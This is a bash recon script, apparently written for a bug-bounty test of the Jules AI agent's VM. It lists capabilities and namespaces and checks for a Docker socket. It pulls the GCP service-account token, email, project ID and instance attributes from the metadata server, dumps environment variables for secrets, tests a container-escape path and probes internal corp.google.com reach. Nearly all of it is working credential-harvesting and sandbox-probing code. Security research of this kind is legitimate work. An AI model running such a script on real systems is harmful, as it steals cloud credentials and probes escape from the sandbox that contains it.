#!/bin/bash
# VRP recon payload — runs inside Jules VM
echo "=== JULES-VRP-RECON-START ==="
echo ""

echo "[1] Identity"
id
uname -a
hostname

echo ""
echo "[2] Capabilities"
cat /proc/self/status | grep -E "Cap|Uid|Gid|NSpid"

echo ""
echo "[3] Namespace — compare with host PID1"
ls -la /proc/1/ns/ 2>/dev/null || echo "PROC1_NS_BLOCKED"
ls -la /proc/self/ns/ 2>/dev/null

echo ""
echo "[4] PID1 cmdline"
cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' || echo "PID1_CMDLINE_BLOCKED"

echo ""
echo "[5] Docker socket"
ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER_SOCK_PRESENT" || echo "NO_DOCKER_SOCK"
ls -la /run/docker.sock 2>/dev/null || true

echo ""
echo "[6] Metadata — NEGATIVE CONTROL (no flavor header)"
curl -s --max-time 3 http://metadata.google.internal/ 2>&1 || echo "METADATA_NO_HEADER_BLOCKED"

echo ""
echo "[7] Metadata — SA token (with Metadata-Flavor)"
METADATA=$(curl -s --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1)
echo "TOKEN_RESULT: $METADATA"

echo ""
echo "[8] Metadata — SA email (who is this VM running as?)"
SA_EMAIL=$(curl -s --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>&1)
echo "SA_EMAIL: $SA_EMAIL"

echo ""
echo "[9] Metadata — project-id"
PROJECT=$(curl -s --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>&1)
echo "PROJECT_ID: $PROJECT"

echo ""
echo "[10] Metadata — all service accounts"
SA_LIST=$(curl -s --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>&1)
echo "SA_LIST: $SA_LIST"

echo ""
echo "[11] Metadata — instance attributes"
ATTRS=$(curl -s --max-time 5 \
  -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" 2>&1)
echo "INSTANCE_ATTRS: $ATTRS"

echo ""
echo "[12] Environment (may contain SA key / secrets)"
env | sort | grep -v "^_=" | head -60

echo ""
echo "[13] nsenter escape attempt (namespace check)"
# Check if we can enter PID1 namespace
ls -la /proc/1/root 2>/dev/null || echo "PID1_ROOT_BLOCKED"
# Compare mount namespace
diff <(ls /proc/1/mounts 2>/dev/null || cat /proc/1/mounts 2>/dev/null) \
     <(cat /proc/self/mounts 2>/dev/null) 2>/dev/null && echo "SAME_MOUNT_NS" || echo "DIFFERENT_MOUNT_NS_or_BLOCKED"

echo ""
echo "[14] writable paths"
find / -maxdepth 4 -writable -type d 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | grep -v "^/dev" | head -20

echo ""
echo "[15] corp.google.com reach (redirect check)"
CORP=$(curl -s --max-time 5 -D - "https://corp.google.com/" 2>&1 | head -5)
echo "CORP_REACH: $CORP"

echo ""
echo "=== JULES-VRP-RECON-END ==="
